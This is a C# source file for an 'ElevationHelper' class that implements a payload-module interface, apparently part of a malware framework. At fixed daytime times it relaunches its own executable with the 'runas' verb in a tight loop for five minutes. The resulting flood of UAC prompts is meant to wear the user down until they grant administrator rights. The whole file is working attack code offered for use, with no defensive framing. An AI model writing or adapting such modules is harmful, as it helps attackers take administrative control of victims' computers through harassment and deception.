using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace zort
{
    public class ElevationHelper : IPayloadModule
    {
        private readonly Thread _elevThread = new Thread(TimedElevate);

        public bool RequiresAdmin => true;
        public string ModuleName => "ElevationHelper";
        public string ModuleDescription => "Spam elevates privileges at scheduled times.";
        public void Start()
        {
            _elevThread.IsBackground = true;
            _elevThread.Start();
        }

        public void Stop()
        {
            if (_elevThread.IsAlive)
            {
                _elevThread.Abort();
            }
        }

        public static bool IsElevated()
        {
            var adminGroup = new System.Security.Principal.SecurityIdentifier(
                System.Security.Principal.WellKnownSidType.BuiltinAdministratorsSid, null);
            var principal = new System.Security.Principal.WindowsPrincipal(
                System.Security.Principal.WindowsIdentity.GetCurrent());
            return principal.IsInRole(adminGroup);
        }

        public static bool TryElevate()
        {
            try
            {
                var process = Process.GetCurrentProcess();
                var startInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    Verb = "runas",
                    FileName = "cmd.exe",
                    Arguments = $"/c start \"\" \"{process.MainModule.FileName}\""
                };
                Process.Start(startInfo);
            }
            catch (Win32Exception ex) when (ex.NativeErrorCode == 1223)
            {
                // User canceled the UAC prompt
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error elevating process: {ex.Message}");
                return false;
            }

            return true;
        }

        public static void TimedElevate()
        {
            var now = DateTime.Now;
            var timesToElevate = new List<TimeSpan>
                {
                    new TimeSpan(9, 15, 0),
                    new TimeSpan(10, 5, 0),
                    new TimeSpan(10, 55, 0),
                    new TimeSpan(11, 45, 0),
                    new TimeSpan(12, 35, 0),
                    new TimeSpan(13, 35, 0),
                    new TimeSpan(14, 15, 0),
                    new TimeSpan(15, 5, 0)
                };

            var nextTime = timesToElevate.FirstOrDefault(t => t > now.TimeOfDay);
            if(nextTime == default) nextTime = timesToElevate.First();
            var waitTime = (nextTime - now.TimeOfDay).TotalMilliseconds;

            if (waitTime < 0)
            {
                waitTime += TimeSpan.FromDays(1).TotalMilliseconds;
            }

            Console.WriteLine($"Waiting for {waitTime / 1000 / 60:F2} mins until next elevation time: {nextTime}");
            Thread.Sleep((int)waitTime);

            var didElevate = false;
            var timeout = nextTime.Add(new TimeSpan(0, 5, 0));

            while (!didElevate && DateTime.Now.TimeOfDay <= timeout)
            {
                didElevate = TryElevate();
            }
        }
    }
}
